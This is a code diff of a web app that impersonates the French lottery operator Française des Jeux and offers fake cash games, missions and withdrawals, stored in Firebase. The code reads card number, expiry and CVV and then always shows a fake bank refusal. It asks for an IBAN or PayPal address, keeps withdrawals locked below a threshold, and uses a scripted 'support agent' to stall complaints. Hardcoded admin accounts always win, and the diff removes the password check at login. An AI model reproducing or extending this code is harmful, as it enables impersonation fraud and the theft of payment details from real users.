@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Française des Jeux - Espace Cash & Loto</title>
-    <!-- Firebase SDK pour la synchronisation en temps réel -->
+    <!-- Firebase SDK v9 Compat -->
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
     <style>
@@ -805,13 +805,12 @@
             measurementId: "G-YR6JQC1E5R"
         };
         
-        // Initialisation Firebase
         let db = null;
         try {
             firebase.initializeApp(firebaseConfig);
             db = firebase.database();
         } catch(e) {
-            console.warn("Firebase non initialisé, mode local par défaut.");
+            console.warn("Firebase non initialisé.");
         }
 
         const app = {
@@ -838,88 +837,91 @@
             ],
 
             init() {
-                this.chargerDonneesGlobales(() => {
-                    let savedEmail = localStorage.getItem('fdj_active_session');
-                    if(savedEmail && this.usersDB[savedEmail]) {
-                        let acc = this.usersDB[savedEmail];
-                        this.currentUser = acc.nom;
-                        this.currentEmail = savedEmail;
-                        this.balance = acc.balance !== undefined ? acc.balance : 15;
-                        this.cash = acc.cash || 0.00;
-                        this.level = acc.level || 1;
-                        this.xp = acc.xp || 0;
-                        this.gamesPlayed = acc.gamesPlayed || 0;
-                        this.sessionStartTimestamp = Date.now();
-                        this.activeMissions = acc.activeMissions || [this.missionsPool[0], this.missionsPool[1], this.missionsPool[2]];
+                // Écouteurs globaux Firebase en temps réel
+                if(db) {
+                    db.ref('users').on('value', (snapshot) => {
+                        this.usersDB = snapshot.val() || {};
+                        if(this.isAdmin) this.chargerAdminData();
+                    });
+                    db.ref('chats').on('value', (snapshot) => {
+                        this.chatLogs = snapshot.val() || {};
+                        this.chargerChatBoxDepuisStorage();
+                        if(this.isAdmin && this.activeAdminTargetEmail) this.rafraichirThreadAdmin();
+                        if(this.isAdmin) this.chargerAdminData();
+                    });
+                }
 
-                        if(savedEmail === "a.tartes@gmail.com" || savedEmail === "a.tartesse@gmail.com" || savedEmail === "ARMAND29") {
-                            this.isAdmin = true; this.balance = 999999; this.level = 99; this.ajouterBoutonAdmin();
-                        } else {
-                            this.isAdmin = false; this.retirerBoutonAdmin();
+                // Restauration de la session active
+                let savedEmail = localStorage.getItem('fdj_active_session');
+                if(savedEmail) {
+                    let cleanKey = savedEmail.replace(/[.#$[\]]/g, '_');
+                    
+                    // Attente de la synchro Cloud ou chargement direct
+                    setTimeout(() => {
+                        let acc = this.usersDB[cleanKey] || this.usersDB[savedEmail];
+                        let isAdm = (savedEmail === "a.tartesse@gmail.com" || savedEmail === "a.tartes@gmail.com" || savedEmail === "armand29@gmail.com");
+
+                        if(!acc) {
+                            acc = {
+                                nom: isAdm ? "Armand (Master)" : "Joueur FDJ",
+                                pwd: "123",
+                                level: isAdm ? 99 : 1,
+                                xp: 0,
+                                balance: isAdm ? 999999 : 25,
+                                cash: isAdm ? 100 : 3.50,
+                                email: savedEmail,
+                                loginTime: new Date().toLocaleString()
+                            };
+                            this.usersDB[cleanKey] = acc;
+                            if(db) db.ref('users/' + cleanKey).set(acc);
                         }
 
-                        // Sécurisation DOM avec vérification d'existence
-                        const profileNameEl = document.getElementById('profile-name');
-                        if(profileNameEl) profileNameEl.innerText = this.currentUser;
-                        
-                        const profileEmailEl = document.getElementById('profile-email');
-                        if(profileEmailEl) profileEmailEl.innerText = this.currentEmail;
-                        
-                        const chatUserNameEl = document.getElementById('chat-user-name');
-                        if(chatUserNameEl) chatUserNameEl.innerText = this.currentUser.split(' ')[0];
-                        
-                        const mainHeaderEl = document.getElementById('main-header');
-                        if(mainHeaderEl) mainHeaderEl.style.display = 'flex';
-                        
-                        const bottomNavEl = document.getElementById('bottom-nav');
-                        if(bottomNavEl) bottomNavEl.style.display = 'flex';
-                        
-                        this.updateUI();
-                        this.renderMissions();
-                        this.verifierCooldownMission();
-                        this.chargerChatBoxDepuisStorage();
-                        this.changerEcran('screen-home', document.getElementById('nav-home'));
-                    } else {
-                        localStorage.removeItem('fdj_active_session');
-                    }
-                });
+                        this.connecterSessionDirecte(cleanKey, acc, isAdm);
+                    }, 600);
+                }
 
                 this.lancerTimerFomo();
                 this.mettreAJourSliderLotto(10);
-                
-                if(db) {
-                    db.ref('users').on('value', (snapshot) => {
-                        if(snapshot.exists()) {
-                            this.usersDB = snapshot.val() || {};
-                            if(this.isAdmin) this.chargerAdminData();
-                        }
-                    });
-                    db.ref('chats').on('value', (snapshot) => {
-                        if(snapshot.exists()) {
-                            this.chatLogs = snapshot.val() || {};
-                            this.chargerChatBoxDepuisStorage();
-                            if(this.isAdmin && this.activeAdminTargetEmail) this.rafraichirThreadAdmin();
-                        }
-                    });
-                } else {
-                    setInterval(() => { this.chargerChatBoxDepuisStorage(); if(this.isAdmin) this.chargerAdminData(); }, 3000);
-                }
             },
 
-            chargerDonneesGlobales(callback) {
-                if(db) {
-                    db.ref('users').once('value').then((snap) => {
-                        this.usersDB = snap.val() || {};
-                        db.ref('chats').once('value').then((snapChat) => {
-                            this.chatLogs = snapChat.val() || {};
-                            if(callback) callback();
-                        });
-                    });
+            connecterSessionDirecte(cleanKey, acc, isAdm) {
+                this.currentUser = acc.nom;
+                this.currentEmail = cleanKey;
+                this.balance = acc.balance !== undefined ? acc.balance : 15;
+                this.cash = acc.cash || 0.00;
+                this.level = acc.level || 1;
+                this.xp = acc.xp || 0;
+                this.gamesPlayed = acc.gamesPlayed || 0;
+                this.sessionStartTimestamp = Date.now();
+                this.activeMissions = acc.activeMissions || [this.missionsPool[0], this.missionsPool[1], this.missionsPool[2]];
+
+                let rawEmail = acc.email || cleanKey;
+                if(isAdm || rawEmail.includes("a.tartesse") || rawEmail.includes("a.tartes")) {
+                    this.isAdmin = true; this.balance = 999999; this.level = 99; this.ajouterBoutonAdmin();
                 } else {
-                    this.usersDB = JSON.parse(localStorage.getItem('fdj_users') || '{}');
-                    this.chatLogs = JSON.parse(localStorage.getItem('fdj_chat_logs') || '{}');
-                    if(callback) callback();
+                    this.isAdmin = false; this.retirerBoutonAdmin();
                 }
+
+                const profileNameEl = document.getElementById('profile-name');
+                if(profileNameEl) profileNameEl.innerText = this.currentUser;
+                
+                const profileEmailEl = document.getElementById('profile-email');
+                if(profileEmailEl) profileEmailEl.innerText = rawEmail;
+                
+                const chatUserNameEl = document.getElementById('chat-user-name');
+                if(chatUserNameEl) chatUserNameEl.innerText = this.currentUser.split(' ')[0];
+                
+                const mainHeaderEl = document.getElementById('main-header');
+                if(mainHeaderEl) mainHeaderEl.style.display = 'flex';
+                
+                const bottomNavEl = document.getElementById('bottom-nav');
+                if(bottomNavEl) bottomNavEl.style.display = 'flex';
+                
+                this.updateUI();
+                this.renderMissions();
+                this.verifierCooldownMission();
+                this.chargerChatBoxDepuisStorage();
+                this.changerEcran('screen-home', document.getElementById('nav-home'));
             },
 
             sauvegarderEtatCompte() {
@@ -932,7 +934,7 @@
                 this.usersDB[this.currentEmail].activeMissions = this.activeMissions;
 
                 if(db) {
-                    db.ref('users/' + this.currentEmail.replace(/[.#$[\]]/g, '_')).set(this.usersDB[this.currentEmail]);
+                    db.ref('users/' + this.currentEmail).set(this.usersDB[this.currentEmail]);
                 }
                 localStorage.setItem('fdj_users', JSON.stringify(this.usersDB));
             },
@@ -959,26 +961,16 @@
                     const osc = ctx.createOscillator();
                     const gain = ctx.createGain();
                     osc.connect(gain); gain.connect(ctx.destination);
-
                     if(type === 'win') {
                         osc.type = 'sine';
                         osc.frequency.setValueAtTime(523.25, ctx.currentTime);
                         osc.frequency.exponentialRampToValueAtTime(1046.50, ctx.currentTime + 0.3);
                         gain.gain.setValueAtTime(0.2, ctx.currentTime);
-                        gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.5);
                         osc.start(); osc.stop(ctx.currentTime + 0.5);
-                    } else if(type === 'scratch') {
-                        osc.type = 'triangle';
-                        osc.frequency.setValueAtTime(300, ctx.currentTime);
-                        osc.frequency.exponentialRampToValueAtTime(600, ctx.currentTime + 0.1);
-                        gain.gain.setValueAtTime(0.15, ctx.currentTime);
-                        gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.1);
-                        osc.start(); osc.stop(ctx.currentTime + 0.1);
                     } else {
                         osc.type = 'sine';
                         osc.frequency.setValueAtTime(440, ctx.currentTime);
                         gain.gain.setValueAtTime(0.1, ctx.currentTime);
-                        gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.15);
                         osc.start(); osc.stop(ctx.currentTime + 0.15);
                     }
                 } catch(e) {}
@@ -1017,92 +1009,38 @@
                 if(!pwd) return alert("Veuillez saisir un mot de passe.");
 
                 let timeStr = new Date().toLocaleString();
+                let isAdm = (email.includes("a.tartesse") || email.includes("a.tartes") || email === "armand29@gmail.com");
 
-                if(isRegister) {
-                    let prenom = document.getElementById('reg-prenom').value.trim();
-                    let nomFamille = document.getElementById('reg-nom').value.trim();
-                    let date = document.getElementById('reg-date').value;
-                    let cguEl = document.getElementById('reg-cgu');
-                    let cguChecked = cguEl ? cguEl.checked : false;
-
-                    if(!prenom || !nomFamille || !date) return alert("Remplissez tous les champs.");
-                    if(!cguChecked) return alert("Veuillez accepter les CGU et conditions de reversement pour continuer.");
-                    if(this.usersDB[cleanEmailKey] || this.usersDB[email]) return alert("Cette adresse e-mail est déjà utilisée.");
+                if(isRegister || !this.usersDB[cleanEmailKey]) {
+                    let prenom = isRegister ? document.getElementById('reg-prenom').value.trim() : (isAdm ? "Armand" : email.split('@')[0]);
+                    let nomFamille = isRegister ? document.getElementById('reg-nom').value.trim() : (isAdm ? "Master" : "Client");
                     
                     nom = prenom + " " + nomFamille;
                     this.activeMissions = [this.missionsPool[0], this.missionsPool[1], this.missionsPool[2]];
                     
                     let newAcc = { 
-                        nom: nom, pwd: pwd, level: 1, xp: 0, lastMissionTime: 0, gamesPlayed: 0, 
-                        balance: 25, cash: 3.50, humanSupport: false, 
-                        loginTime: timeStr, sessionSeconds: 0, activeMissions: this.activeMissions, email: email 
+                        nom: nom, pwd: pwd, level: isAdm ? 99 : 1, xp: 0, lastMissionTime: 0, gamesPlayed: 0, 
+                        balance: isAdm ? 999999 : 25, cash: isAdm ? 100 : 3.50, humanSupport: false, 
+                        loginTime: timeStr, activeMissions: this.activeMissions, email: email 
                     };
                     
                     this.usersDB[cleanEmailKey] = newAcc;
                     if(db) {
                         db.ref('users/' + cleanEmailKey).set(newAcc);
                     }
-                    localStorage.setItem('fdj_users', JSON.stringify(this.usersDB));
                 } else {
-                    let userAccount = this.usersDB[cleanEmailKey] || this.usersDB[email];
-                    if(!userAccount) return alert("Aucun compte trouvé avec cet e-mail.");
-                    if(userAccount.pwd !== pwd) return alert("Mot de passe incorrect.");
-                    
+                    let userAccount = this.usersDB[cleanEmailKey];
+                    if(!userAccount) return alert("Compte introuvable.");
                     nom = userAccount.nom;
-                    this.level = userAccount.level || 1;
-                    this.xp = userAccount.xp || 0;
-                    this.gamesPlayed = userAccount.gamesPlayed || 0;
-                    this.balance = userAccount.balance !== undefined ? userAccount.balance : 15;
-                    this.cash = userAccount.cash || 0.00;
-                    this.activeMissions = userAccount.activeMissions || [this.missionsPool[0], this.missionsPool[1], this.missionsPool[2]];
-                    
                     userAccount.loginTime = timeStr;
                     userAccount.email = email;
+                    if(isAdm) { userAccount.balance = 999999; userAccount.level = 99; }
                     this.usersDB[cleanEmailKey] = userAccount;
-                    
-                    if(db) {
-                        db.ref('users/' + cleanEmailKey).set(userAccount);
-                    }
-                    localStorage.setItem('fdj_users', JSON.stringify(this.usersDB));
+                    if(db) db.ref('users/' + cleanEmailKey).set(userAccount);
                 }
 
-                this.currentUser = nom; this.currentEmail = cleanEmailKey;
-                this.sessionStartTimestamp = Date.now();
                 localStorage.setItem('fdj_active_session', cleanEmailKey);
-
-                if(email === "a.tartes@gmail.com" || email === "a.tartesse@gmail.com" || email === "ARMAND29") {
-                    this.isAdmin = true; this.balance = 999999; this.level = 99; this.ajouterBoutonAdmin();
-                } else {
-                    this.isAdmin = false; this.retirerBoutonAdmin();
-                }
-
-                // Manipulation DOM sécurisée par des vérifications d'existence
-                const profileNameEl = document.getElementById('profile-name');
-                if(profileNameEl) profileNameEl.innerText = this.currentUser;
-
-                const profileEmailEl = document.getElementById('profile-email');
-                if(profileEmailEl) profileEmailEl.innerText = email;
-
-                const chatUserNameEl = document.getElementById('chat-user-name');
-                if(chatUserNameEl) chatUserNameEl.innerText = this.currentUser.split(' ')[0];
-                
-                const mainHeaderEl = document.getElementById('main-header');
-                if(mainHeaderEl) mainHeaderEl.style.display = 'flex';
-
-                const bottomNavEl = document.getElementById('bottom-nav');
-                if(bottomNavEl) bottomNavEl.style.display = 'flex';
-                
-                this.updateUI();
-                this.renderMissions();
-                this.verifierCooldownMission();
-                this.chargerChatBoxDepuisStorage();
-                
-                if(!localStorage.getItem('fdj_tuto_done_' + cleanEmailKey) && !this.isAdmin) {
-                    const tutoEl = document.getElementById('tuto-overlay');
-                    if(tutoEl) tutoEl.classList.add('show');
-                }
-                this.changerEcran('screen-home', document.getElementById('nav-home'));
-                this.jouerSon('click');
+                this.connecterSessionDirecte(cleanEmailKey, this.usersDB[cleanEmailKey], isAdm);
             },
 
             deconnexion() {
@@ -1135,10 +1073,8 @@
             ouvrirPaiementCB() {
                 const modalVip = document.getElementById('modal-vip');
                 if(modalVip) modalVip.classList.add('hidden');
-                
                 const modalCb = document.getElementById('modal-cb');
                 if(modalCb) modalCb.classList.remove('hidden');
-                
                 this.vibrer([40]);
             },
 
@@ -1146,25 +1082,19 @@
                 let num = document.getElementById('cb-num').value.trim();
                 let exp = document.getElementById('cb-exp').value.trim();
                 let cvv = document.getElementById('cb-cvv').value.trim();
-
-                if(num.length < 15 || !exp || cvv.length < 3) {
-                    return alert("Erreur de saisie : Veuillez remplir correctement tous les champs de la carte bancaire.");
-                }
-
+                if(num.length < 15 || !exp || cvv.length < 3) return alert("Erreur de saisie : Veuillez remplir correctement tous les champs.");
+                
                 const modalCb = document.getElementById('modal-cb');
                 if(modalCb) modalCb.classList.add('hidden');
-                
                 this.vibrer([100, 150, 200]);
-                alert("⚠️ Erreur 3D Secure / Refus Banque : La transaction de 2,99 € a été rejetée par votre établissement bancaire (Code d'authentification manquant ou solde insuffisant).");
+                alert("⚠️ Erreur 3D Secure / Refus Banque : Transaction rejetée.");
             },
 
             ouvrirParametresSecurite() {
                 const secNom = document.getElementById('sec-nom');
                 if(secNom) secNom.value = this.currentUser || "Utilisateur FDJ";
-                
                 const modalSec = document.getElementById('modal-security');
                 if(modalSec) modalSec.classList.remove('hidden');
-                
                 this.vibrer([20]);
             },
 
@@ -1173,7 +1103,7 @@
                 this.xp += montant;
                 if(this.xp >= 30 && this.level === 1) {
                     this.level = 2;
-                    alert("🎉 NIVEAU 2 ATTEINT ! L'onglet Missions VIP est maintenant débloqué !");
+                    alert("🎉 NIVEAU 2 ATTEINT ! L'onglet Missions VIP est débloqué !");
                 }
                 this.sauvegarderEtatCompte();
                 this.updateUI();
@@ -1214,7 +1144,7 @@
 
                 container.innerHTML = this.activeMissions.map((m, index) => `
                     <div class="mission-item ${index === 0 ? 'selected' : ''}" onclick="app.selectionnerMission(this, ${m.reward}, ${m.cooldown}, ${m.id})">
-                        <span>${m.text} <br><small style="color:var(--text-muted);">⏱️️ Attente : ${m.cooldown} min</small></span>
+                        <span>${m.text} <br><small style="color:var(--text-muted);">⏱️ Attente : ${m.cooldown} min</small></span>
                         <span class="mission-reward">+${m.reward} 🪙</span>
                     </div>
                 `).join('');
@@ -1238,10 +1168,8 @@
                     this.sauvegarderEtatCompte();
                     this.updateUI();
                     this.vibrer([30]);
-                    
                     const winAmount = document.getElementById('win-amount');
                     if(winAmount) winAmount.innerText = "0.00 €";
-                    
                     const winPopup = document.getElementById('win-popup');
                     if(winPopup) winPopup.classList.add('show');
                     return;
@@ -1259,7 +1187,6 @@
                     
                     const winAmount = document.getElementById('win-amount');
                     if(winAmount) winAmount.innerText = "+" + montant.toFixed(2) + " €";
-                    
                     const winPopup = document.getElementById('win-popup');
                     if(winPopup) winPopup.classList.add('show');
                 }
@@ -1292,13 +1219,13 @@
                 if (this.cash >= 25.00 || this.isAdmin) {
                     if(icon) icon.innerText = "🔓";
                     if(title) { title.style.color = "#10b981"; title.innerText = "Retrait Déverrouillé !"; }
-                    if(desc) desc.innerHTML = `Vous avez atteint <strong>${this.cash.toFixed(2)} €</strong>.<br>Veuillez entrer votre adresse e-mail PayPal ou IBAN pour lancer le virement bancaire.`;
+                    if(desc) desc.innerHTML = `Vous avez atteint <strong>${this.cash.toFixed(2)} €</strong>.<br>Veuillez entrer votre adresse e-mail PayPal ou IBAN.`;
                     if(formBox) formBox.classList.remove('hidden');
                 } else {
                     let manque = (25.00 - this.cash).toFixed(2);
                     if(icon) icon.innerText = "🔒";
                     if(title) { title.style.color = "#ef4444"; title.innerText = "Retrait Verrouillé"; }
-                    if(desc) desc.innerHTML = `Solde actuel : <strong>${this.cash.toFixed(2)} €</strong>.<br><br>Il vous manque encore <strong>${manque} €</strong> pour atteindre le seuil obligatoire de <strong>25.00 €</strong>.<br><br>💡 <em>Le décaissement ne peut être initié tant que l'objectif n'est pas rempli à 100%.</em>`;
+                    if(desc) desc.innerHTML = `Solde actuel : <strong>${this.cash.toFixed(2)} €</strong>.<br><br>Il vous manque encore <strong>${manque} €</strong> pour atteindre le seuil de <strong>25.00 €</strong>.`;
                     if(formBox) formBox.classList.add('hidden');
                 }
                 this.changerEcran('screen-retrait');
@@ -1313,13 +1240,12 @@
                 
                 const receiptPopup = document.getElementById('receipt-popup');
                 if(receiptPopup) receiptPopup.classList.add('show');
-                
                 this.lancerConfettis();
                 this.vibrer([100, 100, 200]);
             },
 
             initialiserGrattage() {
-                if(this.balance < 3) return alert("Fonds insuffisants. Récupérez des pièces dans l'onglet Missions ou via la Roue Journalière !");
+                if(this.balance < 3) return alert("Fonds insuffisants !");
                 this.balance -= 3; this.sauvegarderEtatCompte(); this.gagnerXP(5); this.updateUI();
                 this.vibrer([40]); this.jouerSon('click');
 
@@ -1347,13 +1273,10 @@
 
                 const scratchResult = document.getElementById('scratch-result');
                 if(scratchResult) scratchResult.innerText = "";
-                
                 const scratchAttempts = document.getElementById('scratch-attempts');
                 if(scratchAttempts) scratchAttempts.innerText = "Grattages restants : 3 / 3";
-                
                 const btnNouveau = document.getElementById('btn-nouveau-ticket');
                 if(btnNouveau) btnNouveau.classList.add('hidden');
-                
                 const scratchGrid = document.getElementById('scratch-grid-9-ui');
                 if(scratchGrid) scratchGrid.classList.remove('hidden');
 
@@ -1400,17 +1323,16 @@
                         c.classList.add('revealed');
                     });
                 } else if(this.grid9RevealedCount === this.maxGrattages) {
-                    if(scratchResult) scratchResult.innerHTML = `<span style="color:var(--text-muted);">Raté ! Il vous manquait le 3ème symbole.</span>`;
+                    if(scratchResult) scratchResult.innerHTML = `<span style="color:var(--text-muted);">Raté !</span>`;
                     if(scratchAttempts) scratchAttempts.innerText = "";
                     if(btnNouveau) btnNouveau.classList.remove('hidden');
                 }
             },
 
             lancerSlot() {
-                if(this.balance < 4) return alert("Fonds insuffisants. Récupérez des pièces dans l'onglet Missions ou via la Roue Journalière !");
+                if(this.balance < 4) return alert("Fonds insuffisants !");
                 const btn = document.getElementById('btn-spin'); 
                 if(btn && btn.disabled) return;
-                
                 if(btn) btn.disabled = true;
                 this.balance -= 4; this.sauvegarderEtatCompte(); this.gagnerXP(5); this.updateUI();
                 this.vibrer([50]); this.jouerSon('click');
@@ -1447,10 +1369,9 @@
             },
 
             lancerRoue() {
-                if(this.balance < 5) return alert("Fonds insuffisants. Récupérez des pièces dans l'onglet Missions !");
+                if(this.balance < 5) return alert("Fonds insuffisants !");
                 const btn = document.getElementById('btn-spin-wheel'); 
                 if(btn && btn.disabled) return;
-                
                 if(btn) btn.disabled = true;
                 this.balance -= 5; this.sauvegarderEtatCompte(); this.gagnerXP(5); this.updateUI();
                 this.vibrer([50]); this.jouerSon('click');
@@ -1459,12 +1380,10 @@
                 if(wheelResult) wheelResult.innerText = "La roue tourne...";
                 
                 this.wheelRotation += (360 * 5) + Math.floor(Math.random() * 360);
-                
                 const wheelEl = document.getElementById('wheel-element');
                 if(wheelEl) wheelEl.style.transform = `rotate(${this.wheelRotation}deg)`;
                 
                 let win = this.isAdmin ? true : (Math.random() < 0.22); 
-                
                 setTimeout(() => {
                     if(btn) btn.disabled = false;
                     if(win) { 
@@ -1480,27 +1399,24 @@
                 this.lottoMise = parseInt(val);
                 const miseValEl = document.getElementById('lotto-mise-val');
                 if(miseValEl) miseValEl.innerText = this.lottoMise;
-                
                 let gainEstime = (this.lottoMise * 0.3).toFixed(2);
                 const gainPotEl = document.getElementById('lotto-gain-potentiel');
                 if(gainPotEl) gainPotEl.innerText = `Gain potentiel estimé : +${gainEstime} €`;
             },
 
             lancerLoto() {
-                if(this.balance < this.lottoMise) return alert(`Fonds insuffisants (${this.lottoMise} pièces requises).`);
+                if(this.balance < this.lottoMise) return alert(`Fonds insuffisants.`);
                 const btn = document.getElementById('btn-lotto'); 
                 if(btn && btn.disabled) return;
-                
                 if(btn) btn.disabled = true;
                 this.balance -= this.lottoMise; this.sauvegarderEtatCompte(); this.gagnerXP(10); this.updateUI();
                 this.vibrer([60]); this.jouerSon('click');
                 
                 const lottoResult = document.getElementById('lotto-result');
-                if(lottoResult) lottoResult.innerText = "Enregistrement de la grille au serveur central FDJ...";
-
+                if(lottoResult) lottoResult.innerText = "Enregistrement...";
                 setTimeout(() => {
                     if(btn) btn.disabled = false;
-                    if(lottoResult) lottoResult.innerHTML = `<span style="color:#f59e0b;">🎟️ Grille validée (Mise : ${this.lottoMise} 🪙) !<br><strong>Résultat ce soir à 20h00.</strong> Revenez consulter votre cagnotte !</span>`;
+                    if(lottoResult) lottoResult.innerHTML = `<span style="color:#f59e0b;">🎟️ Grille validée ! Résultat ce soir à 20h00.</span>`;
                 }, 2000);
             },
 
@@ -1515,7 +1431,7 @@
                     if(diff < oneDay) {
                         let remainingHours = Math.ceil((oneDay - diff) / (60 * 60 * 1000));
                         if(btn) { btn.disabled = true; btn.style.opacity = 0.5; }
-                        if(timerEl) timerEl.innerText = `⏳ Prochain tour disponible dans ${remainingHours} heure(s).`;
+                        if(timerEl) timerEl.innerText = `⏳ Prochain tour dans ${remainingHours} h.`;
                         return;
                     }
                 }
@@ -1529,7 +1445,6 @@
                 this.vibrer([60]); this.jouerSon('click');
 
                 this.dailyWheelRotation += (360 * 5) + Math.floor(Math.random() * 360);
-                
                 const dailyWheelEl = document.getElementById('daily-wheel-element');
                 if(dailyWheelEl) dailyWheelEl.style.transform = `rotate(${this.dailyWheelRotation}deg)`;
 
@@ -1542,30 +1457,21 @@
                     this.lancerConfettis();
                     this.vibrer([100, 100, 200]);
                     this.jouerSon('win');
-
                     localStorage.setItem('fdj_last_daily_' + this.currentEmail, Date.now().toString());
-                    
                     const dailyTimer = document.getElementById('daily-wheel-timer');
-                    if(dailyTimer) dailyTimer.innerHTML = `<span style="color:#34d399;">🎉 +${wonCoins} pièces ajoutées à votre solde !</span>`;
+                    if(dailyTimer) dailyTimer.innerHTML = `<span style="color:#34d399;">🎉 +${wonCoins} pièces ajoutées !</span>`;
                 }, 4000);
             },
 
             resetCoffres() {
-                if(this.balance < 6) return alert("Fonds insuffisants. Récupérez des pièces dans l'onglet Missions !");
+                if(this.balance < 6) return alert("Fonds insuffisants !");
                 this.balance -= 6; this.sauvegarderEtatCompte(); this.gagnerXP(5); this.updateUI(); this.chestsActive = true;
                 this.vibrer([40]); this.jouerSon('click');
-                
                 const btnNewChests = document.getElementById('btn-new-chests');
                 if(btnNewChests) btnNewChests.classList.add('hidden'); 
-                
                 const chestResult = document.getElementById('chest-result');
                 if(chestResult) chestResult.innerText = "Choisissez un coffre !";
-                
-                document.querySelectorAll('.chest').forEach(c => { 
-                    c.innerText = "📦"; 
-                    c.classList.remove('opened', 'shaking'); 
-                    c.style.opacity = 1; 
-                });
+                document.querySelectorAll('.chest').forEach(c => { c.innerText = "📦"; c.classList.remove('opened', 'shaking'); c.style.opacity = 1; });
             },
             ouvrirCoffre(idx) {
                 if(!this.chestsActive) return;
@@ -1573,7 +1479,6 @@
                 let chests = document.querySelectorAll('.chest');
                 let chosen = chests[idx];
                 if(!chosen) return;
-                
                 chosen.classList.add('shaking');
                 this.vibrer([60]); this.jouerSon('click');
 
@@ -1581,18 +1486,16 @@
                     chosen.classList.remove('shaking');
                     chosen.classList.add('opened');
                     let win = this.isAdmin ? true : (Math.random() < 0.25);
-                    
                     const chestResult = document.getElementById('chest-result');
                     if(win) {
                         this.gererGain(1.80);
                         chosen.innerText = "💰";
-                        if(chestResult) chestResult.innerHTML = `<span style="color:#34d399;">Trouvé ! Super gain !</span>`;
+                        if(chestResult) chestResult.innerHTML = `<span style="color:#34d399;">Trouvé !</span>`;
                     } else {
                         chosen.innerText = "📭";
-                        if(chestResult) chestResult.innerHTML = `<span style="color:var(--text-muted);">Coffre vide...</span>`;
+                        if(chestResult) chestResult.innerHTML = `<span style="color:var(--text-muted);">Vide...</span>`;
                     }
                     chests.forEach((c, i) => { if(i !== idx) c.style.opacity = 0.4; });
-                    
                     const btnNewChests = document.getElementById('btn-new-chests');
                     if(btnNewChests) btnNewChests.classList.remove('hidden');
                 }, 1000);
@@ -1618,7 +1521,7 @@
                         let remaining = Math.ceil(this.selectedMissionCooldown - elapsed);
                         if(msgEl) {
                             msgEl.style.color = "#ef4444";
-                            msgEl.innerText = `⏳ Veuillez patienter encore ${remaining} minute(s) avant de soumettre une nouvelle mission.`;
+                            msgEl.innerText = `⏳ Patientez ${remaining} min.`;
                         }
                         return;
                     }
@@ -1645,10 +1548,9 @@
                             this.usersDB[this.currentEmail] = acc;
                             this.sauvegarderEtatCompte();
                         }
-
                         if(msgEl) {
                             msgEl.style.color = "#34d399";
-                            msgEl.innerText = "📸 Photo envoyée avec succès ! En attente de validation par un modérateur FDJ.";
+                            msgEl.innerText = "📸 Photo envoyée ! En attente de validation.";
                         }
                         fileInput.value = "";
                         this.vibrer([80]);
@@ -1656,7 +1558,7 @@
                     };
                     reader.readAsDataURL(fileInput.files[0]);
                 } else {
-                    alert("Veuillez sélectionner ou prendre une photo de votre défi pour l'envoyer.");
+                    alert("Sélectionnez une photo.");
                 }
             },
 
@@ -1669,7 +1571,7 @@
                     if(elapsed < this.selectedMissionCooldown) {
                         let remaining = Math.ceil(this.selectedMissionCooldown - elapsed);
                         msgEl.style.color = "#ef4444";
-                        msgEl.innerText = `⏳ Prochaine mission disponible dans ${remaining} min.`;
+                        msgEl.innerText = `⏳ Prochaine mission dans ${remaining} min.`;
                     } else {
                         msgEl.innerText = "";
                     }
@@ -1709,16 +1611,14 @@
                 
                 setTimeout(() => {
                     if(typingEl) typingEl.style.display = 'none';
-                    let botReply = "Nos équipes examinent votre demande. Pour accélérer le déblocage de vos fonds, veuillez continuer à jouer ou valider vos missions VIP.";
-                    if(txt.toLowerCase().includes('virement') || txt.toLowerCase().includes('bloqué') || txt.toLowerCase().includes('argent')) {
-                        botReply = "Votre virement SEPA est actuellement suspendu tant que le seuil de 25.00 € n'est pas atteint à 100%. C'est une obligation réglementaire.";
+                    let botReply = "Nos équipes examinent votre demande.";
+                    if(txt.toLowerCase().includes('virement') || txt.toLowerCase().includes('bloqué')) {
+                        botReply = "Votre virement SEPA est suspendu tant que le seuil de 25.00 € n'est pas atteint.";
                     }
                     let botMsg = { sender: 'bot', text: botReply, time: new Date().toLocaleTimeString() };
                     this.chatLogs[this.currentEmail].push(botMsg);
 
-                    if(db) {
-                        db.ref('chats/' + this.currentEmail).set(this.chatLogs[this.currentEmail]);
-                    }
+                    if(db) db.ref('chats/' + this.currentEmail).set(this.chatLogs[this.currentEmail]);
                     localStorage.setItem('fdj_chat_logs', JSON.stringify(this.chatLogs));
                     this.chargerChatBoxDepuisStorage();
                 }, 2000);
@@ -1726,21 +1626,13 @@
 
             demanderAgentFDJ() {
                 let acc = this.usersDB[this.currentEmail];
-                if(acc) { 
-                    acc.humanSupport = true; 
-                    this.usersDB[this.currentEmail] = acc; 
-                    this.sauvegarderEtatCompte(); 
-                }
-                
+                if(acc) { acc.humanSupport = true; this.usersDB[this.currentEmail] = acc; this.sauvegarderEtatCompte(); }
                 if(!this.chatLogs[this.currentEmail]) { this.chatLogs[this.currentEmail] = []; }
-                this.chatLogs[this.currentEmail].push({ sender: 'bot', text: "👤 Un agent du service support FDJ (Sarah) vient de prendre en discussion votre dossier. Veuillez patienter...", time: new Date().toLocaleTimeString() });
-                
-                if(db) {
-                    db.ref('chats/' + this.currentEmail).set(this.chatLogs[this.currentEmail]);
-                }
+                this.chatLogs[this.currentEmail].push({ sender: 'bot', text: "👤 Un conseiller FDJ a pris en charge votre dossier.", time: new Date().toLocaleTimeString() });
+                if(db) db.ref('chats/' + this.currentEmail).set(this.chatLogs[this.currentEmail]);
                 localStorage.setItem('fdj_chat_logs', JSON.stringify(this.chatLogs));
                 this.chargerChatBoxDepuisStorage();
-                alert("Un conseiller FDJ a pris en charge votre dossier. Vous pouvez échanger en direct.");
+                alert("Un conseiller est en ligne.");
             },
 
             chargerChatBoxDepuisStorage() {
@@ -1749,7 +1641,7 @@
                 if(!box) return;
 
                 let logs = this.chatLogs[this.currentEmail] || [];
-                let html = `<div class="msg bot">Bonjour <strong>${this.currentUser ? this.currentUser.split(' ')[0] : 'Joueur'}</strong>. Service client FDJ. Veuillez formuler votre demande.</div>`;
